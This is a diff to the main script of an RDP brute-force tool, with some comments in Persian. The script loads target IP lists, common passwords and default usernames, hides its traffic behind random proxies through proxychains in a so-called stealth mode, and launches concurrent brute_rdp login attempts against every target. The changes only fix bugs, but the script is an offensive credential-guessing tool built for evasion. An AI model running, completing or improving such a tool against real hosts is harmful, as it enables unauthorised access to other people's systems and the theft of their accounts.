@@ -1,5 +1,5 @@
 #!/usr/bin/env python3
-import sys  # <-- اضافه شد (فیکس اصلی!)
+import sys
 from config import COMMON_PASSWORDS, DEFAULT_USERS
 from utils import load_ips, save_line, periodic_stats
 from brute import brute_rdp
@@ -38,7 +38,7 @@ args = parser.parse_args()
 
 if not args.ips_file:
     parser.print_help()
-    sys.exit(1)  # حالا sys import شده – بدون ارور!
+    sys.exit(1)
 
 # =============== SETTINGS ===============
 USERS = [u.strip() for u in args.users.split(',')]
@@ -60,7 +60,7 @@ elif args.proxy.endswith('.txt'):
         proxies = [line.strip() for line in f if line.strip()]
     if proxies:
         proxy = random.choice(proxies)
-        PROXY_CMD = f"proxychains -q -f /tmp/proxychains.conf "  # تنظیم proxychains.conf خودت
+        PROXY_CMD = f"proxychains -q -f /tmp/proxychains.conf "
         print(f"[+] Stealth mode: Random proxy ({proxy})")
 else:
     print("[+] Network mode: Direct")
@@ -78,9 +78,8 @@ async def main():
     sem = asyncio.Semaphore(MAX_WORKERS)
     loop = asyncio.get_event_loop()
 
-    # کال کردن periodic_stats درست
-    stats_task = periodic_stats(stats, lock, cpu_proc, stats["start_time"])
-    loop.create_task(stats_task())
+    # فیکس نهایی: periodic_stats حالا async هست، مستقیم create_task می‌کنیم
+    loop.create_task(periodic_stats(stats, lock, cpu_proc, stats["start_time"]))
 
     tasks = [brute_rdp(ip, sem, USERS, PASSWORD_LIST, PROXY_CMD, args.auto_nla, results_file, stats, lock) for ip in all_ips]
     await asyncio.gather(*tasks, return_exceptions=True)
@@ -91,6 +90,3 @@ async def main():
 signal.signal(signal.SIGINT, lambda s,f: os._exit(0))
 if __name__ == "__main__":
     asyncio.run(main())
-EOF
-
-chmod +x ~/main.py
